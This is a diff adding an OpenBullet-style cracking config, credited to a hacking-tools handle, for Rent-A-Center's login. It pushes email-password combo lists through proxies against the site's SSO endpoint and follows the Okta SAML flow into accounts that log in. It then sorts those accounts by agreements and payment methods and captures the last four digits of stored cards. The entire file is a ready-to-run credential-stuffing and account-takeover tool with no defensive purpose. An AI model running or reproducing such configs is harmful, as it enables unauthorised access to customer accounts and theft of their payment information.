@@ -1,0 +1,194 @@
+[SETTINGS]
+{
+  "Name": "Rent A Center(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-09T20:32:14.9459877+01:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": true,
+  "AlwaysOpen": false,
+  "AlwaysQuit": true,
+  "DisableNotifications": true,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "--incognito"
+}
+
+[SCRIPT]
+FUNCTION Base64Encode "<PASS>" -> VAR "p" 
+
+FUNCTION CurrentUnixTime -> VAR "t" 
+
+FUNCTION GetRandomUA -> VAR "UA" 
+
+REQUEST POST "https://sso.rentacenter.com/sso-login/signin" 
+  CONTENT "{\"userName\": \"<USER>\",\"password\": \"<p>\",\"fromURI\":\"https://rtosso.okta.com/app/rentacenterapirtosso_ecommv2rentacentercom_1/exkcmenkdpTMg4ZIh1t7/sso/saml?RelayState=https%3A%2F%2Fwww.rentacenter.com%2F\",\"anowSSO\":\"false\" }," 
+  CONTENTTYPE "application/json" 
+  HEADER "accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "content-type: application/json" 
+  HEADER "correlationid: <t>" 
+  HEADER "dnt: 1" 
+  HEADER "origin: https://sso.rentacenter.com" 
+  HEADER "referer: https://sso.rentacenter.com/sso-login/signin.html?fromURI=https%3A%2F%2Frtosso.okta.com%2Fapp%2Frentacenterapirtosso_ecommv2rentacentercom_1%2FexkcmenkdpTMg4ZIh1t7%2Fsso%2Fsaml%3FRelayState%3Dhttps%253A%252F%252Fwww.rentacenter.com%252F" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-gpc: 1" 
+  HEADER "user-agent: <UA>" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<HEADERS(err-message)>" EqualTo "Sign in failed." 
+  KEYCHAIN Success OR 
+    KEY "sessionToken" 
+
+PARSE "<SOURCE>" JSON "sessionToken" -> VAR "sessionToken" 
+
+PARSE "<SOURCE>" JSON "guId" -> VAR "guId" 
+
+PARSE "<SOURCE>" JSON "redirectUrl" -> VAR "redirectUrl" 
+
+REQUEST GET "https://rtosso.okta.com/app/rentacenterapirtosso_ecommv2rentacentercom_1/exkcmenkdpTMg4ZIh1t7/sso/saml?RelayState=https://www.rentacenter.com/&sessionToken=<sessionToken>" 
+  
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "dnt: 1" 
+  HEADER "referer: https://sso.rentacenter.com/" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "sec-gpc: 1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.62 Safari/537.36" 
+
+PARSE "<SOURCE>" LR "<input name=\"SAMLResponse\" type=\"hidden\" value=\"" "\"" -> VAR "SAMLResponse" 
+
+FUNCTION HTMLEntityDecode "<SAMLResponse>" -> VAR "SAMLResponse" 
+
+REQUEST POST "https://www.rentacenter.com/racsso/saml/SSO" EncodeContent=TRUE 
+  CONTENT "SAMLResponse=<SAMLResponse>RelayState=https%3A%2F%2Fwww.rentacenter.com%2F" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 11285" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Host: www.rentacenter.com" 
+  HEADER "Origin: https://rtosso.okta.com" 
+  HEADER "Referer: https://rtosso.okta.com/" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.62 Safari/537.36" 
+  HEADER "dnt: 1" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-gpc: 1" 
+
+REQUEST GET "https://www.rentacenter.com/en/myaccount/payonline-getstarted" 
+  
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: www.rentacenter.com" 
+  HEADER "Referer: https://www.rentacenter.com/myaccount/agreements" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.62 Safari/537.36" 
+  HEADER "dnt: 1" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-gpc: 1" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "LINK MY AGREEMENT" 
+
+REQUEST GET "https://www.rentacenter.com/en/myaccount/paymentmethods" EncodeContent=TRUE 
+  
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: www.rentacenter.com" 
+  HEADER "Referer: https://www.rentacenter.com/myaccount/agreements" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.62 Safari/537.36" 
+  HEADER "dnt: 1" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-gpc: 1" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" AND 
+    KEY "Add or delete your payment method" 
+    KEY "<SOURCE>" DoesNotContain "XXXX XXXX XXXX" 
+
+PARSE "<SOURCE>" LR "<div class=\"fontMob12\">XXXX XXXX XXXX " "</div>" Recursive=TRUE CreateEmpty=FALSE -> CAP "Last4" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Retry AND 
+    KEY "<SOURCE>" DoesNotContain "LINK MY AGREEMENT" 
+    KEY "<Last4>" DoesNotExist 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
